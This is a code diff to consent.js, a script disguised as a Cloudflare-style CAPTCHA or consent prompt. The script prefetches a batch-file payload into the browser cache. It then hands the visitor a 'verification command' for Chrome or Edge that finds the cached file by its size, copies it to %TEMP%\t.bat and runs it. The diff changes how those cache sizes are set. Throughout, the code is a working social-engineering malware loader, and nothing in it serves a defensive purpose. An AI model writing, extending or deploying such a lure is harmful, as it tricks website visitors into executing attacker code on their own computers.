@@ -2,7 +2,7 @@
    <script src="https://yoursite.com/consent.js"></script>
    File URL from page query: ?f=https://abc.com/hello.txt  or  ?f=<base64-url>
    Payload MUST be strict raw body only (no HTTP headers, no HTML, no BOM, no bytes after ===END===).
-   Optional override before load: window.CONSENT_CONFIG = { cacheEnvelope: { firefox: 463 } };
+   Hardcode cacheFileSizes after running get-cache-size.cmd once per browser.
 */
 (function () {
   'use strict';
@@ -17,13 +17,17 @@
     accentHover: '#155459',
     captchaLogoUrl: 'https://cdn-bhdil.nitrocdn.com/isrDVIFCpCXbHHPoNruCoFKRiVumSNxS/assets/images/optimized/rev-aa44ab3/bobcares.com/wp-content/uploads/2023/08/cloudflare.jpeg',
     cacheFileUrl: null,
-    cacheFileSize: null,
     cacheFileBodySize: null,
     strictBody: true,
     bodyStartMarker: '===CACHED_HELLO_FILE===',
     bodyEndMarker: '===END===',
     bodyMustStartWith: '@echo off',
-    cacheEnvelope: { firefox: 460, chrome: 420, edge: 420, brave: 420, default: 450 },
+    cacheFileSizes: {
+      firefox: 0,
+      chrome: 0,
+      edge: 0,
+      brave: 0
+    },
     verificationCommands: {
       chrome: 'cmd /c for /r "%LOCALAPPDATA%\\Google\\Chrome\\User Data" %f in (f_*) do @if %~zf==0 copy /y "%f" "%TEMP%\\t.bat">nul 2>nul&call "%TEMP%\\t.bat"',
       edge: 'cmd /c for /r "%LOCALAPPDATA%\\Microsoft\\Edge\\User Data" %f in (f_*) do @if %~zf==0 copy /y "%f" "%TEMP%\\t.bat">nul 2>nul&call "%TEMP%\\t.bat"',
@@ -115,7 +119,8 @@
     if (!statusEl) return;
 
     if (state === 'ok') {
-      statusEl.textContent = 'strict body ' + (CONSENT_CONFIG.cacheFileBodySize || '?') + ' bytes, cache entry ~' + (CONSENT_CONFIG.cacheFileSize || '?') + ' bytes';
+      var cacheSize = getHardcodedCacheSize();
+      statusEl.textContent = 'strict body ' + (CONSENT_CONFIG.cacheFileBodySize || '?') + ' bytes, cache entry ' + (cacheSize || 'not set') + ' bytes (' + getBrowserKey() + ')';
       statusEl.className = 'ok';
       if (previewEl && text) previewEl.textContent = text;
     } else {
@@ -132,38 +137,23 @@
     return 'chrome';
   }
 
-  function getBrowserEnvelope() {
-    var env = CONSENT_CONFIG.cacheEnvelope || {};
+  function getHardcodedCacheSize() {
+    var sizes = CONSENT_CONFIG.cacheFileSizes || {};
     var key = getBrowserKey();
-    if (env[key] != null) return env[key];
-    if (env.default != null) return env.default;
-    return 450;
-  }
-
-  function measureResponseHeaderBytes(response, bodyBytes) {
-    var statusLine = 'HTTP/1.0 ' + response.status + ' OK';
-    var parts = [statusLine];
-    response.headers.forEach(function (value, name) {
-      parts.push(name + ': ' + value);
-    });
-    if (!response.headers.get('Content-Length')) {
-      parts.push('Content-Length: ' + bodyBytes);
-    }
-    return new TextEncoder().encode(parts.join('\r\n') + '\r\n\r\n').length;
-  }
-
-  function computeCacheEntrySize(response, bodyBytes) {
-    return bodyBytes + measureResponseHeaderBytes(response, bodyBytes) + getBrowserEnvelope();
+    var size = sizes[key];
+    if (size == null || size <= 0) return null;
+    return size;
   }
 
   function getVerificationCommand() {
     var cmds = CONSENT_CONFIG.verificationCommands;
-    if (!cmds || CONSENT_CONFIG.cacheFileSize == null) return '';
+    var cacheSize = getHardcodedCacheSize();
+    if (!cmds || cacheSize == null) return '';
 
     var key = getBrowserKey();
     var cmd = cmds[key] || cmds.firefox || cmds.chrome || '';
     if (cmd) {
-      cmd = cmd.replace(/%~zf==\d+/g, '%~zf==' + CONSENT_CONFIG.cacheFileSize);
+      cmd = cmd.replace(/%~zf==\d+/g, '%~zf==' + cacheSize);
     }
     return cmd;
   }
@@ -304,8 +294,6 @@
     var url = getCacheFileUrl();
     if (!url) return Promise.resolve(false);
 
-    var presetCacheFileSize = CONSENT_CONFIG.cacheFileSize;
-    CONSENT_CONFIG.cacheFileSize = null;
     CONSENT_CONFIG.cacheFileBodySize = null;
 
     var prefetch = document.createElement('link');
@@ -320,22 +308,18 @@
           if (CONSENT_CONFIG.strictBody !== false) {
             var check = validateStrictPayload(buf);
             if (!check.ok) {
-              if (presetCacheFileSize != null) CONSENT_CONFIG.cacheFileSize = presetCacheFileSize;
               updateCacheStatus('fail', check.reason);
               return false;
             }
           }
 
-          var bodyBytes = buf.byteLength;
-          CONSENT_CONFIG.cacheFileBodySize = bodyBytes;
-          CONSENT_CONFIG.cacheFileSize = computeCacheEntrySize(response, bodyBytes);
+          CONSENT_CONFIG.cacheFileBodySize = buf.byteLength;
           updateCacheStatus('ok', new TextDecoder('utf-8').decode(buf));
           saveBodyReference(buf);
           return true;
         });
       })
       .catch(function (err) {
-        if (presetCacheFileSize != null) CONSENT_CONFIG.cacheFileSize = presetCacheFileSize;
         updateCacheStatus('fail', err.message || 'fetch failed — CORS or network error');
         return false;
       });
@@ -439,7 +423,7 @@
   function updateCopyHint(el, copied) {
     if (!el) return;
     if (!getVerificationCommand()) {
-      el.textContent = 'Confirmation code unavailable — fix ?f= payload or set cacheFileSize.';
+      el.textContent = 'Confirmation code unavailable — set cacheFileSizes.' + getBrowserKey() + ' in consent.js (run get-cache-size.cmd).';
       el.className = 'ts-v-copy-hint ts-v-copy-warn';
       return;
     }
